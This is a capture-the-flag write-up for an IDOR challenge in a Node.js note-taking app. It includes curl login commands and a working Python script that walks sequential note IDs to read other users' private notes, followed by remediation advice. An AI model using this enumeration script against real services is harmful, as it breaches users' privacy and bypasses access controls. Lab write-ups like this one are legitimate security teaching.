# The Gate of Broken Names

**Challenge Name:** The Gate of Broken Names  
**Category:** Web Security  
**Difficulty:** Easy-Medium  
**Points:** TBD

## Challenge Description

> Among the ruins of Briarfold, Mira uncovers a gate of tangled brambles and forgotten sigils. Every name carved into its stone has been reversed, letters twisted, meanings erased. When she steps through, the ground blurs—the village ahead is hers, yet wrong: signs rewritten, faces familiar but altered, her own past twisted. Tracing the pattern through spectral threads of lies and illusion, she forces the true gate open—not by key, but by unraveling the false paths the Hollow King left behind.

## Technical Summary

A note-taking application with user authentication where users can create private and public notes. The challenge involves exploiting an **Insecure Direct Object Reference (IDOR)** vulnerability to access other users' private notes without proper authorization.

## Initial Analysis

![Challenge Interface](Screenshot%202025-10-24%20at%2010.30.50PM.png)

The application is a Node.js/Express web app with the following features:
- User authentication with session management
- Note creation (public/private visibility options)
- Note viewing and listing
- API endpoints for note management


## Vulnerability Analysis

### Insecure Direct Object Reference (IDOR)

The application has an API endpoint that retrieves individual notes by ID. The vulnerability occurs because:

1. ✅ The endpoint checks if a user is authenticated
2. ❌ The endpoint does NOT verify if the authenticated user owns the note
3. ❌ The endpoint does NOT check if the note is private before returning it

This allows any authenticated user to access ANY note (including private ones) by simply knowing or guessing the note ID.

**Proper authorization should check:**
- Does the note belong to the current user? OR
- Is the note marked as public?

Without these checks, the application exposes all users' private data to anyone who can enumerate note IDs.

## Exploitation

### Step 1: Create an Account and Login

Register and login to obtain a valid session:
```bash
curl -X POST http://target:port/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"password123"}'

curl -X POST http://target:port/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"password123"}' \
  -c cookies.txt
```

### Step 2: Enumerate Note IDs

The application likely uses sequential note IDs. We can enumerate them to find all notes:

```python
#!/usr/bin/env python3
import requests
import sys

def exploit(target_url, session_cookie):
    """
    Exploit IDOR vulnerability to enumerate and read all notes
    """
    cookies = {"connect.sid": session_cookie}
    
    print("[*] Starting IDOR exploitation...")
    print(f"[*] Target: {target_url}")
    
    found_notes = []
    
    for note_id in range(1, 200):
        try:
            response = requests.get(
                f"{target_url}/api/notes/{note_id}",
                cookies=cookies,
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                found_notes.append(data)
                
                is_private = "🔒 PRIVATE" if data.get('is_private') == 1 else "🔓 Public"
                
                print(f"\n[+] Note #{note_id} - {is_private}")
                print(f"    Title: {data.get('title')}")
                print(f"    Owner: {data.get('username')}")
                print(f"    Content: {data.get('content')[:100]}...")
                
                # Check for flag
                content = data.get('content', '')
                if 'HTB{' in content:
                    flag_start = content.find('HTB{')
                    flag_end = content.find('}', flag_start) + 1
                    flag = content[flag_start:flag_end]
                    print(f"\n[!] 🎯 FLAG FOUND: {flag}")
                    return flag
                    
        except requests.exceptions.RequestException as e:
            continue
    
    print(f"\n[*] Enumeration complete. Found {len(found_notes)} notes.")
    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python solve.py <target_url> <session_cookie>")
        print("Example: python solve.py http://134.122.71.206:30878 s%3Axxxxx...")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    session_cookie = sys.argv[2]
    
    flag = exploit(target_url, session_cookie)
    
    if flag:
        print(f"\n[✓] Success! Flag: {flag}")
    else:
        print("\n[✗] Flag not found in enumerated notes")
```

### Step 3: Extract the Flag

The flag is stored in a private note belonging to another user (likely an admin or special user). By enumerating all note IDs, we can access it despite being marked as private.

## Running the Exploit

```bash
# 1. Login and get session cookie
curl -X POST http://134.122.71.206:30878/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"password123"}' \
  -v 2>&1 | grep "Set-Cookie"

# 2. Run exploit with session cookie
python3 solve.py http://134.122.71.206:30878 "s%3Ag1c7mu9KEIN_hOt-7rUJuKDAqRazbCHa..."
```

## Impact

This IDOR vulnerability allows:
- **Privacy Breach**: Access to all private notes from all users
- **Data Exfiltration**: Reading sensitive information meant to be private
- **Authorization Bypass**: Circumventing access controls

## Remediation

### Fix the Authorization Check

The API endpoint should include proper authorization logic:

```javascript
// Pseudocode for proper authorization
if (note.is_private === 1 && note.user_id !== current_user_id) {
    return res.status(403).json({ error: 'Access denied' });
}
```

### Additional Security Measures

1. **Implement Role-Based Access Control (RBAC)** - Clear ownership verification
2. **Use UUIDs instead of sequential IDs** - Makes enumeration harder
3. **Add rate limiting** - Prevent rapid enumeration attempts
4. **Log unauthorized access attempts** - Detect and respond to attacks
5. **Implement API authentication tokens** - Better session management

## Key Takeaways

1. **Always verify ownership**: Check if the authenticated user has permission to access the requested resource
2. **Principle of Least Privilege**: Users should only access their own data unless explicitly shared
3. **Defense in Depth**: Implement multiple layers of authorization checks
4. **Avoid Predictable IDs**: Use UUIDs or other non-sequential identifiers

## Tools Used

- **Python 3** with requests library
- **cURL** for API testing
- **Burp Suite** (optional) for intercepting requests

## References

- [OWASP: Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
